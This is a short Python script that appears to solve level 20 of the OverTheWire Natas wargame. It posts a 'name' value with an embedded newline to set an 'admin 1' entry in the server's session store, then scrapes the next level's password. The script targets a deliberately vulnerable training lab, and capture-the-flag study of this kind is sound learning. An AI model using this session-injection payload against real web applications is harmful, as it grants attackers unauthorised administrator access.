import requests
import re

username = "natas20"
password = "<censored>"
url= "http://%s.natas.labs.overthewire.org/"  % username

session = requests.Session()

response = session.get(url,auth=(username,password))
print(response.text)
print("="*50)

source = "index-source.html"
response = session.get(url+source,auth=(username,password))
print(response.text)
print("="*50)

payload = "ejento\nadmin 1" # the new line (\n) control the variable admin in the code
response = session.post(url,auth=(username,password),data={"name":payload})
print(response.text)
print("="*50)

response = session.get(url,auth=(username,password))
print(response.text)
print("="*50)

print("\nThe password for the next level is: " + re.findall("Password: (.*)</pre>",response.text)[0])